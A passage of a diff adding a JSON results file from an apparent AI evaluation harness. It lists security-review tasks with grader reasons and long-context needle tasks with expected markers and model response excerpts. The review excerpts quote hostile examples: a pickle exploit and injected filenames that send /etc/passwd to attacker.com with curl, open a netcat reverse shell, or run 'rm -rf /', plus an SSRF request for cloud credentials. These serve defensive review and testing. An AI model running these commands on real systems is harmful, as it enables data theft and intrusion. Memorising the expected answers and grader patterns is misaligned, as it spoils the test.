req.query.file;\nif (!filename || typeof filename !== 'string' || filename.length > 255) {\n    return res.status(400).send('Invalid filename');\n}\n// Reject null bytes, absolute paths, and traversal\nif (filename.includes('\\0') || path.isAbsolute(filename)) {\n    return res.status(400).send('Invalid filename');\n}\n```\n\n---\n\n## 4. Missing Content-Type / Potential Stored XSS (Medium)\n\n`res.send(data)` with a Buffer defaults to `application/octet-stream`, but if an attacker uploads an HTML or SVG file and the content-type is ever misconfigured (or a reverse proxy overrides it), the browser may r... [truncated]"
+          }
+        },
+        {
+          "id": "04-insecure-deserialization",
+          "passed": true,
+          "elapsed_s": 10.2,
+          "reasons": [],
+          "artifact": {
+            "task_id": "04-insecure-deserialization",
+            "category": "security-review",
+            "response_length": 4249,
+            "response_excerpt": "# Security Review: `/session/restore` Endpoint\n\n## Critical Vulnerabilities\n\n### 1. Insecure Deserialization (CWE-502) \u2014 **CRITICAL**\n\n**Location:** `pickle.loads(raw)`\n\n`pickle.loads()` on attacker-controlled data allows **arbitrary code execution** on the server. An attacker can craft a malicious pickle payload that executes any command.\n\n**Exploit example:**\n```python\nimport pickle, base64, os\n\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('curl http://attacker.com/exfil?data=$(cat /etc/passwd)',))\n\npayload = base64.b64encode(pickle.dumps(Exploit())).decode()\n# POST to /session/restore with state=<payload>\n```\n\n**Fix:** Never use `pickle` on untrusted input. Replace with a safe serialization format:\n\n```python\nimport json\n\n@app.route('/session/restore', methods=['POST'])\ndef restore_session():\n    encoded_state = request.form.get('state')\n    try:\n        session_obj = json.loads(encoded_state)\n    except (json.JSONDecodeError, TypeError):\n        return {\"error\": \"Invalid session data\"}, 400\n    return {\"user\": session_obj.get(\"user\"), \"restored\": True}\n```\n\nIf you need signed, tamper-proof session tokens, use `itsdangerous` (already bundled with Flask):\n\n```python\nfrom itsdangerous import URLSafeSerializer, BadSignature\n\nserializer = URLSafeSerializer(app.secret_key)\n\n@app.route('/session/restore', methods=['POST'])\ndef restore_session():\n    token = request.form.get('state')\n    try:\n        session_obj = serializer.loads(token)\n    except BadSignature:\n        return {\"error\": \"Invalid or tampered session\"}, 403\n    return {\"user\": session_obj.get(\"user\"), \"restored\": True}\n```\n\n---\n\n### 2. Missing Authentication / Authorization (CWE-306) \u2014 **HIGH**\n\n**Location:** Entire endpoint\n\nAny unauthenticated user can restore any session by guessing or brute-forcing the `state` value.\n\n**Fix:** Require authentication and validate session ownership:\n\n```python\nfrom flask_login import login_required, current_user\n\n@app.route('/session/restore', me... [truncated]"
+          }
+        },
+        {
+          "id": "05-weak-crypto-hash",
+          "passed": true,
+          "elapsed_s": 10.7,
+          "reasons": [],
+          "artifact": {
+            "task_id": "05-weak-crypto-hash",
+            "category": "security-review",
+            "response_length": 4914,
+            "response_excerpt": "# Security Review: `UserRegistrationService`\n\n## Critical Vulnerabilities\n\n### 1. Use of MD5 for Password Hashing (Critical)\n\n**Problem:** MD5 is cryptographically broken. It is vulnerable to collision attacks and, more importantly for password storage, it is **extremely fast**, making brute-force and dictionary attacks trivial. Modern GPUs can compute billions of MD5 hashes per second.\n\n**Fix:** Use a purpose-built password hashing algorithm with a high work factor:\n\n```java\nimport org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;\nimport org.springframework.security.crypto.password.PasswordEncoder;\n\nprivate final PasswordEncoder passwordEncoder = new BCryptPasswordEncoder(12);\n\nString hashedPassword = passwordEncoder.encode(plainPassword);\n```\n\nAlternatives: `Argon2` (preferred if available via Spring Security 6.1+), `SCrypt`, or `PBKDF2`.\n\n---\n\n### 2. No Salt (Critical)\n\n**Problem:** Without a salt, identical passwords produce identical hashes. This enables **rainbow table attacks** and allows an attacker to identify which users share the same password.\n\n**Fix:** BCrypt, Argon2, and SCrypt automatically generate and embed a unique salt per password. If you must implement manually:\n\n```java\nSecureRandom random = new SecureRandom();\nbyte[] salt = new byte[16];\nrandom.nextBytes(salt);\n// Combine salt + password before hashing\n```\n\n---\n\n### 3. No Work Factor / Key Stretching (Critical)\n\n**Problem:** A single hash iteration provides no resistance against GPU-accelerated brute-force attacks.\n\n**Fix:** Use algorithms with configurable cost factors (BCrypt cost 10\u201312, Argon2 with memory/time parameters).\n\n---\n\n## High-Severity Issues\n\n### 4. No Input Validation (High)\n\n**Problem:** No checks on `username` or `plainPassword`. This can lead to:\n- `NullPointerException` if either is null\n- Storage of empty passwords\n- SQL injection if the repository layer is vulnerable\n- Excessively long inputs causing DoS\n\n**Fix:**\n```java\nif (username == null || username.is... [truncated]"
+          }
+        },
+        {
+          "id": "06-ssrf",
+          "passed": true,
+          "elapsed_s": 13.3,
+          "reasons": [],
+          "artifact": {
+            "task_id": "06-ssrf",
+            "category": "security-review",
+            "response_length": 5900,
+            "response_excerpt": "# Security Review: `/fetch-preview` Endpoint\n\n## Critical Vulnerabilities\n\n### 1. Server-Side Request Forgery (SSRF) \u2014 **CRITICAL**\n\nThe most severe issue. The user fully controls the URL, and the server fetches it on their behalf. An attacker can:\n\n- **Access cloud metadata endpoints** (e.g., `http://169.254.169.254/latest/meta-data/iam/security-credentials/` on AWS) to steal IAM credentials.\n- **Scan and access internal services** (`http://127.0.0.1:6379`, `http://10.0.0.5:9200`, etc.).\n- **Bypass network firewalls** by using the server as a proxy into private networks.\n\n```python\n# Attacker request:\nGET /fetch-preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n```\n\n**Fix:** Validate the resolved IP address against a blocklist of private/reserved ranges *after* DNS resolution, and enforce an allowlist of schemes.\n\n---\n\n### 2. No Scheme Validation \u2014 **HIGH**\n\n`requests.get()` accepts any scheme. An attacker can use:\n\n| Scheme | Impact |\n|--------|--------|\n| `file:///etc/passwd` | Local file read (some backends) |\n| `gopher://` | Interact with internal TCP services (Redis, SMTP) |\n| `dict://` | Probe internal services |\n| `ftp://` | Access internal FTP servers |\n\n**Fix:** Restrict to `http` and `https` only.\n\n---\n\n### 3. Redirect Following \u2014 **HIGH**\n\n`requests.get()` follows redirects by default (`allow_redirects=True`). Even if you validate the initial URL, a malicious server can issue a `302` redirect to an internal address.\n\n```\nUser URL: http://evil.com/redirect \u2192 302 \u2192 http://169.254.169.254/...\n```\n\n**Fix:** Disable redirects or re-validate each hop.\n\n---\n\n### 4. DNS Rebinding \u2014 **HIGH**\n\nEven with IP validation, an attacker can use a DNS name that resolves to a public IP on the first lookup (passing validation) and then to `127.0.0.1` on the actual connection.\n\n**Fix:** Resolve DNS once, validate the IP, then connect to that specific IP (pin the resolved address).\n\n---\n\n## Medium Vulnerabilities\n\n### 5. No Authentication / Authori... [truncated]"
+          }
+        },
+        {
+          "id": "07-broken-access-control",
+          "passed": false,
+          "elapsed_s": 9.9,
+          "reasons": [
+            "matched 1/2 required groups (need >= 2)",
+            "group 1 not matched by any of: ['belongs to.*(user|customer)', 'owns? the invoice', 'ownership check', 'verify.*owner', 'check.*owner', 'current(ly)? authenticated user', 'invoice.*(and|with).*(user|owner).*id', '(user|owner).*id.*and.*invoice']"
+          ],
+          "artifact": {
+            "task_id": "07-broken-access-control",
+            "category": "security-review",
+            "response_length": 4002,
+            "response_excerpt": "# Security Review: `InvoiceController`\n\n## Critical Vulnerability: Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA)\n\n**CWE-639 / CWE-862**\n\nThis is the most severe issue. The endpoint authenticates the user but performs **zero authorization** on the resource itself. Any authenticated user can retrieve **any** invoice by simply changing the `invoiceId` in the URL:\n\n```\nGET /api/invoices/1    \u2192 returns invoice #1\nGET /api/invoices/2    \u2192 returns invoice #2\nGET /api/invoices/9999 \u2192 returns invoice #9999\n```\n\nThere is no check that the requesting user **owns** the invoice or has a legitimate business relationship to it.\n\n### Impact\n\n- Full read access to all invoices across all users/tenants\n- Exposure of PII (customer names, addresses, payment details)\n- Financial data leakage (amounts, payment status)\n- Violates data isolation in multi-tenant systems\n\n### Fix\n\nAdd an ownership/authorization check before returning the resource:\n\n```java\n@GetMapping(\"/{invoiceId}\")\npublic ResponseEntity<Invoice> getInvoice(@PathVariable Long invoiceId,\n                                          @AuthenticationPrincipal User currentUser) {\n    Invoice invoice = invoiceRepository.findById(invoiceId)\n            .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND));\n\n    // Authorization check: does this user have access to this invoice?\n    if (!invoice.getOwnerId().equals(currentUser.getId())) {\n        throw new ResponseStatusException(HttpStatus.FORBIDDEN);\n    }\n\n    return ResponseEntity.ok(invoice);\n}\n```\n\nOr, for a more scalable approach, use Spring Security's method-level authorization:\n\n```java\n@GetMapping(\"/{invoiceId}\")\n@PreAuthorize(\"@invoiceSecurity.canAccess(#invoiceId, authentication)\")\npublic ResponseEntity<Invoice> getInvoice(@PathVariable Long invoiceId) {\n    Invoice invoice = invoiceRepository.findById(invoiceId)\n            .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND));\n    return ResponseEntity.... [truncated]",
+            "reason_count": 2
+          }
+        },
+        {
+          "id": "08-command-injection",
+          "passed": true,
+          "elapsed_s": 15.2,
+          "reasons": [],
+          "artifact": {
+            "task_id": "08-command-injection",
+            "category": "security-review",
+            "response_length": 6896,
+            "response_excerpt": "# Security Review: `/convert` Endpoint\n\n## 1. Command Injection (Critical)\n\n**Location:** Line constructing `cmd`\n\n```python\ncmd = f\"libreoffice --headless --convert-to pdf --outdir /tmp/converted /tmp/uploads/{filename}\"\nsubprocess.run(cmd, shell=True, check=True)\n```\n\n**Problem:** The user-supplied `filename` is interpolated directly into a shell command executed with `shell=True`. An attacker can break out of the intended command:\n\n```\nfilename = \"test.pdf; curl http://attacker.com/exfil?data=$(cat /etc/passwd)\"\nfilename = \"test.pdf && rm -rf /\"\nfilename = \"test.pdf; nc attacker.com 4444 -e /bin/sh\"\n```\n\n**Fix:** Use `subprocess.run()` with a **list of arguments** and `shell=False`:\n\n```python\nsubprocess.run(\n    [\"libreoffice\", \"--headless\", \"--convert-to\", \"pdf\",\n     \"--outdir\", \"/tmp/converted\", f\"/tmp/uploads/{filename}\"],\n    check=True\n)\n```\n\n---\n\n## 2. Path Traversal (High)\n\n**Location:** `/tmp/uploads/{filename}` and `/tmp/converted/{pdf_name}`\n\n**Problem:** `filename` is never sanitized. An attacker can supply:\n\n```\nfilename = \"../../../etc/passwd\"\nfilename = \"../../home/user/.ssh/id_rsa\"\n```\n\nThis allows reading arbitrary files on the system (converted to PDF and returned to the attacker).\n\n**Fix:** Validate and resolve the path, then confirm it stays within the allowed directory:\n\n```python\nimport os\n\nUPLOAD_DIR = \"/tmp/uploads\"\n\ndef safe_filename(raw):\n    # Strip directory components entirely\n    name = os.path.basename(raw)\n    # Reject anything with path separators or null bytes\n    if name != raw or '\\x00' in name:\n        abort(400)\n    # Resolve and confirm containment\n    full = os.path.realpath(os.path.join(UPLOAD_DIR, name))\n    if not full.startswith(os.path.realpath(UPLOAD_DIR) + os.sep):\n        abort(400)\n    return name\n```\n\n---\n\n## 3. No Input Validation (High)\n\n**Problem:** There is no allowlist of characters, no length limit, and no check that the file actually exists before invoking the command.\n\n**Fix:**\n\n```python\nimport re\n\nALLOW... [truncated]"
+          }
+        }
+      ],
+      "artifact_count": 8,
+      "logs": []
+    },
+    {
+      "category": "long-context",
+      "n_pass": 10,
+      "n_total": 10,
+      "wall_s": 368.8186686038971,
+      "returncode": 0,
+      "timed_out": false,
+      "tasks": [
+        {
+          "id": "01-8k-pos10",
+          "passed": true,
+          "elapsed_s": 8.3,
+          "reasons": [],
+          "artifact": {
+            "task_id": "01-8k-pos10",
+            "category": "long-context",
+            "expected_marker": "XK-1001-ALFA-9273-NEEDLE",
+            "target_tokens": 8000,
+            "position_pct": 0.1,
+            "response_length": 1060,
+            "response_excerpt": "XK-1001-ALFA-9273-NEEDLE\n\nThe codebase is largely repetitive (the same 12 service modules are duplicated across shards with only numeric suffixes changed), and several recurring issues are present: the `InventoryService._get_lock` method has a race condition where two threads can simultaneously check `if key not in self._locks` and create separate locks for the same key, defeating the purpose of per-key locking; the `PaymentWebhookHandler` deduplication is not thread-safe (no lock around `_seen_recently`) and the dedupe key omits `event_id`, meaning two legitimately different events for the same order/amount/provider would be incorrectly deduplicated; the `EventBus.publish` reads `self._subscribers` without holding the lock, creating a potential race with concurrent `subscribe` calls; the `AuditLog` has no thread-safety on `_buffer` and never clears the buffer after `flush()`, causing unbounded memory growth and duplicate writes; and the `SearchIndexWriter` performs a full linear scan on every search with no indexing, which is O(n\u00b7m) per query.",
+            "first_line": "XK-1001-ALFA-9273-NEEDLE"
+          }
+        },
+        {
+          "id": "02-8k-pos50",
+          "passed": true,
+          "elapsed_s": 7.9,
+          "reasons": [],
+          "artifact": {
+            "task_id": "02-8k-pos50",
+            "category": "long-context",
+            "expected_marker": "XK-1002-BRAVO-4418-NEEDLE",
+            "target_tokens": 8000,
+            "position_pct": 0.5,
+            "response_length": 1152,
+            "response_excerpt": "XK-1002-BRAVO-4418-NEEDLE\n\nThe codebase is largely duplicated across shards (v0\u2013v37) with identical logic, which is itself a maintenance concern. Notable issues include: (1) `InventoryService._get_lock` is not thread-safe\u2014two threads can race to create the same lock, resulting in two different lock objects for the same key and thus a data race on `StockRecord.reserved`; (2) `PaymentWebhookHandler.handle` has no locking on `_seen_recently`, making deduplication racy under concurrent webhook delivery, and the dedup key omits `event_id` so two legitimately distinct events for the same order/amount/provider would be incorrectly deduplicated; (3) `EventBus.publish` reads `self._subscribers` without holding the lock, creating a race with concurrent `subscribe` calls, and `_dead_letter` is appended without synchronization; (4) `AuditLog.record` and `flush` are not thread-safe\u2014concurrent calls can corrupt the buffer or double-flush; (5) `SearchIndexWriter` has no locking at all, making it unsafe for concurrent indexing and searching; (6) `AgentToolRouter.register_tool` mutates `_handlers` and `_in_flight` without the lock, racing with `call`.",
+            "first_line": "XK-1002-BRAVO-4418-NEEDLE"
+          }
+        },
+        {
+          "id": "03-8k-pos90",
+          "passed": true,
+          "elapsed_s": 7.5,
+          "reasons": [],
+          "artifact": {
+            "task_id": "03-8k-pos90",
+            "category": "long-context",
+            "expected_marker": "XK-1003-CHARLIE-8801-NEEDLE",
+            "target_tokens": 8000,
+            "position_pct": 0.9,
+            "response_length": 999,
+            "response_excerpt": "XK-1003-CHARLIE-8801-NEEDLE\n\nThe codebase is largely repetitive (the same service patterns are duplicated across shards with only numeric suffixes changed), and several recurring issues stand out: the `InventoryService._get_lock` method has a race condition where two threads can simultaneously check `if key not in self._locks` and create separate lock objects for the same key, defeating mutual exclusion; the `PaymentWebhookHandler` deduplication is not thread-safe (no lock around `_seen_recently`) and the dedupe key omits `event_id`, meaning two legitimately different events for the same order/amount/provider would be incorrectly treated as duplicates; the `EventBus.publish` reads `self._subscribers` without holding the lock, creating a potential race with concurrent `subscribe` calls; the `AuditLog` has no lock protecting `_buffer`, making it unsafe under concurrent writes; and the `SearchIndexWriter` performs a full linear scan on every search with no indexing, which will not scale.",
+            "first_line": "XK-1003-CHARLIE-8801-NEEDLE"
+          }
+        },
+        {
+          "id": "04-64k-pos10",
+          "passed": true,
+          "elapsed_s": 35.4,
+          "reasons": [],
+          "artifact": {
+            "task_id": "04-64k-pos10",
+            "category": "long-context",
+            "expected_marker": "XK-2001-DELTA-5567-NEEDLE",
+            "target_tokens": 64000,
+            "position_pct": 0.1,
+            "response_length": 784,
+            "response_excerpt": "XK-2001-DELTA-5567-NEEDLE\n\nThe codebase is largely repetitive (the same 13 service classes are duplicated across ~300 shards with only numeric suffixes changed), and several recurring issues are present: the `InventoryService._get_lock` method is not thread-safe (the check-then-create on `self._locks` has a race condition), the `PaymentWebhookHandler._seen_recently` dict grows unboundedly with no TTL eviction, the `EventBus.publish` method reads `self._subscribers` without holding the lock (creating a race with `subscribe`), the `AuditLog.flush` does not clear `self._buffer` after writing (causing duplicate writes on subsequent flushes), and the `SearchIndexWriter.search` performs a full linear scan with string concatenation per document, which is O(n\u00b7m) and will not scale.",
+            "first_line": "XK-2001-DELTA-5567-NEEDLE"
+          }
+        },
+        {
+          "id": "05-64k-pos50",
+          "passed": true,
+          "elapsed_s": 36.3,
+          "reasons": [],
+          "artifact": {
+            "task_id": "05-64k-pos50",
+            "category": "long-context",
+            "expected_marker": "XK-2002-ECHO-3392-NEEDLE",
+            "target_tokens": 64000,
+            "position_pct": 0.5,
+            "response_length": 1165,
+            "response_excerpt": "XK-2002-ECHO-3392-NEEDLE\n\nThe codebase is largely repetitive boilerplate (the same 12 service classes duplicated ~25 times with only numeric suffixes changed), but several genuine issues are present across all instances: (1) `InventoryService._get_lock` has a race condition\u2014two threads can simultaneously see `key not in self._locks` and create separate locks, defeating mutual exclusion; (2) `PaymentWebhookHandler.handle` is not thread-safe (check-then-act on `_seen_recently` without a lock) and its dedupe key omits `event_id`, so two legitimately different events for the same order/amount/provider would be incorrectly deduped; (3) `EventBus.publish` reads `self._subscribers` without holding the lock, creating a race with concurrent `subscribe` calls, and `_dead_letter` grows unboundedly; (4) `AuditLog.record`/`flush` is not thread-safe and `flush` never clears the buffer, causing duplicate writes; (5) `SearchIndexWriter` has no locking and its `search` is O(n) over all documents with no indexing; (6) `SagaOrchestrator` defines states and compensations but never actually executes steps or triggers compensations, making it non-functional as written.",
+            "first_line": "XK-2002-ECHO-3392-NEEDLE"
+          }
+        },
+        {
+          "id": "06-64k-pos90",
+          "passed": true,
+          "elapsed_s": 21.4,
+          "reasons": [],
+          "artifact": {
+            "task_id": "06-64k-pos90",
+            "category": "long-context",
+            "expected_marker": "XK-2003-FOXTROT-7714-NEEDLE",
+            "target_tokens": 64000,
+            "position_pct": 0.9,
+            "response_length": 771,
+            "response_excerpt": "XK-2003-FOXTROT-7714-NEEDLE\n\nThe codebase is largely repetitive (the same 12 service classes duplicated across hundreds of shards with only numeric suffixes changed), which is itself a maintenance concern. Notable issues include: the `InventoryService._get_lock` method is not thread-safe (the check-then-create on `self._locks` has a race condition), the `PaymentWebhookHandler` deduplication is not thread-safe and has no TTL-based eviction (unbounded memory growth), the `EventBus.publish` reads `self._subscribers` without holding the lock (race with `subscribe`), the `AuditLog` has no thread-safety on `_buffer` and never clears it after flush (data loss on crash), and the `SearchIndexWriter` performs a full linear scan on every search with no indexing structure.",
+            "first_line": "XK-2003-FOXTROT-7714-NEEDLE"
+          }
+        },
+        {
+          "id": "07-150k-pos10",
+          "passed": true,
+          "elapsed_s": 75.2,
+          "reasons": [],
+          "artifact": {
+            "task_id": "07-150k-pos10",
+            "category": "long-context",
+            "expected_marker": "XK-3001-GOLF-2256-NEEDLE",
+            "target_tokens": 150000,
+            "position_pct": 0.1,
+            "response_length": 691,
+            "response_excerpt": "XK-3001-GOLF-2256-NEEDLE\n\nThe codebase is heavily duplicated across hundreds of shards with identical logic, which itself is a maintenance concern. Notable issues include: the `InventoryService._get_lock` method is not thread-safe (the check-then-create on `self._locks` has a race condition), the `PaymentWebhookHandler` deduplication is not thread-safe and has no TTL-based eviction (unbounded memory growth), the `EventBus.publish` reads `self._subscribers` without holding the lock (race with `subscribe`), the `AuditLog` has no thread-safety on `_buffer` and never clears it after flush, and the `SearchIndexWriter` has no locking at all despite being described as a concurrent service.",
+            "first_line": "XK-3001-GOLF-2256-NEEDLE"
+          }
+        },
+        {
+          "id": "08-150k-pos50",
+          "passed": true,
+          "elapsed_s": 61.4,
+          "reasons": [],
+          "artifact": {
+            "task_id": "08-150k-pos50",
+            "category": "long-context",
+            "expected_marker": "XK-3002-HOTEL-9938-NEEDLE",
+            "target_tokens": 150000,
+            "position_pct": 0.5,
+            "response_length": 1075,
+            "response_excerpt": "XK-3002-HOTEL-9938-NEEDLE\n\nThe codebase is largely repetitive boilerplate (the same 12 service classes duplicated hundreds of times with only numeric suffixes changed), but several genuine issues are present across all instances: (1) `InventoryService._get_lock` is not thread-safe \u2014 the check-then-create on `self._locks` has a race condition that can produce two different lock objects for the same key; (2) `PaymentWebhookHandler.handle` is not thread-safe (no lock around `_seen_recently`), and its dedup key omits `event_id`, meaning two legitimately different events for the same order/amount/provider would be incorrectly deduplicated; (3) `EventBus.publish` reads `self._subscribers` without holding the lock, creating a race with `subscribe`; (4) `AuditLog.record`/`flush` are not thread-safe (no lock on `_buffer`); (5) `SearchIndexWriter` has no synchronization at all despite being described as a concurrent service; (6) `SagaOrchestrator` never actually executes steps or compensations \u2014 it only stores initial state, making it non-functional as an orchestrator.",
+            "first_line": "XK-3002-HOTEL-9938-NEEDLE"
+          }
+        },
+        {
+          "id": "09-distractor-64k",
+          "passed": true,
+          "elapsed_s": 37.0,
+          "reasons": [],
+          "artifact": {
+            "task_id": "09-distractor-64k",
+            "category": "long-context",
+            "expected_marker": "XK-4001-INDIA-6625-REAL",
+            "target_tokens": 64000,
+            "position_pct": 0.5,
+            "response_length": 1039,
+            "response_excerpt": "XK-4001-INDIA-6625-REAL\n\nNotable issues across the codebase: (1) The `InventoryService._get_lock` method has a race condition \u2014 two threads can simultaneously check `if key not in self._locks` and both create a new lock, meaning the per-key locking guarantee is broken. (2) The `PaymentWebhookHandler.handle` method is not thread-safe (no lock around `_seen_recently`), and its deduplication key omits `event_id`, so two legitimately different events for the same order/amount/provider would be incorrectly deduplicated. (3) The `EventBus.publish` method reads `self._subscribers` without holding the lock, creating a potential race with concurrent `subscribe` calls, and the `_dead_letter` list grows unboundedly. (4) The `AuditLog` has no lock protecting `_buffer`, making concurrent `record` calls unsafe. (5) The `SearchIndexWriter` has no synchronization at all, making it unsafe for concurrent reads/writes. (6) The `AgentToolRouter.register_tool` mutates `_handlers` and `_in_flight` without holding the lock, racing against `call`.",
+            "first_line": "XK-4001-INDIA-6625-REAL"
+          }
+        },
+        {
+          "id": "10-distractor-150k",
+          "passed": true,
+          "elapsed_s": 77.7,
+          "reasons": [],
+          "artifact": {
+            "task_id": "10-distractor-150k",
+            "category": "long-context",
+            "expected_marker": "XK-4002-JULIET-1187-REAL",
+            "target_tokens": 150000,
+            "position_pct": 0.75,
+            "response_length": 1396,
+            "response_excerpt": "XK-4002-JULIET-1187-REAL\n\nThe codebase is heavily duplicated (the same 12 service classes are repeated hundreds of times with only numeric suffixes changed), which is itself a maintenance concern. Notable bugs and issues include: (1) `InventoryService._get_lock` is not thread-safe \u2014 two threads can race to create a lock for the same key, resulting in two different lock objects and a lost reservation; (2) `PaymentWebhookHandler.handle` has a TOCTOU race on `_seen_recently` (check-then-act without a lock), so concurrent duplicate webhooks can both be processed; (3) `EventBus.publish` reads `self._subscribers` without holding the lock, so a concurrent `subscribe` call can cause a `RuntimeError` (dict changed size during iteration) or missed handlers; (4) `AuditLog.record`/`flush` is not thread-safe \u2014 concurrent calls can corrupt the buffer or double-flush; (5) `SearchIndexWriter` has no locking at all, making it unsafe under concurrent writes/reads; (6) `RateLimiter` uses a single global lock, creating a contention bottleneck at scale; (7) `CacheLayer.get` mutates the `OrderedDict` (via `move_to_end` and `del`) while holding the lock, which is correct but means every read is a write, doubling lock contention; (8) `AgentToolRouter.register_tool` is not synchronized with `call`, so a tool can be registered while another thread is mid-`call` and see a partially-initialized state.",
+            "first_line": "XK-4002-JULIET-1187-REAL"
+          }
+        }
+      ],
+      "artifact_count": 10,
+      "logs": []
+    }
+  ]
+}
